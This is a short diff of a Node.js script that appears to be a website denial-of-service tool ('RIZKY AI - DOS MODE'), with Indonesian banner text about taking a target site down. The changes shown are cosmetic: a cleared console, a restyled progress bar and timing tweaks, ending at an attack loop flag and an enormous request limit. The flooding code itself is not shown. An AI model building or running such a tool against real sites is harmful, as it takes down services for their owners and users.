@@ -178,6 +178,7 @@ function askForUrl() {
             askForUrl(); // tanya ulang
         } else {
      
+console.clear();
 console.log("\x1b[38;5;46m");
 console.log("╭━𓊈 \x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬 𝗔𝗜\x1b[38;5;46m - \x1b[38;5;82m𝗗𝗢𝗦 𝗠𝗢𝗗𝗘\x1b[38;5;46m 𓊉━═╣");
 console.log("┃ ⚙️ \x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗡𝗚𝗔𝗡 𝗗𝗢𝗦 ⚙️\x1b[38;5;46m");
@@ -186,18 +187,20 @@ console.log("┃📡 \x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦 : \x1b[0mꜱᴇ�
 console.log("┃🕒 \x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡   : \x1b[0mᴊᴀɴɢᴀɴ ꜱᴇʀᴀɴɢ ᴡᴇʙꜱɪᴛᴇ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ");
 console.log("┃⚠️ \x1b[38;5;196m 𝗘𝗙𝗘𝗞    : \x1b[0mʙɪꜱᴀ ʙɪᴋɪɴ ᴡᴇʙꜱɪᴛᴇ ᴅᴏᴡɴ ᴘᴀᴋᴀɪʟᴀʜ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ");
 console.log("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣");
+console.log("\x1b[0m");
 
 let percent = 0;
-const width = 20;
+const width = 30;
 
 setInterval(() => {
-    const filled = Math.floor(percent / (100 / width));
-    const empty = width - filled;
-    const bar = '█'.repeat(filled) + '▒'.repeat(empty);
-    process.stdout.write(`\r\x1b[38;5;46m[${bar}] ${percent}%`);
-    percent += 5;
-    if (percent > 100) percent = 0; // Reset ke 0% setelah 100%
-}, 150);
+  const filled = Math.floor(percent / (100 / width));
+  const empty = width - filled;
+  const bar = '█'.repeat(filled) + '▒'.repeat(empty);
+
+  process.stdout.write(`\r\x1b[32m📦 MENGUNDUH DATA: [${bar}] ${percent}%\x1b[0m`);
+  percent += 2;
+  if (percent > 100) percent = 0;
+}, 100);
 
             let continueAttack = true;
             const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
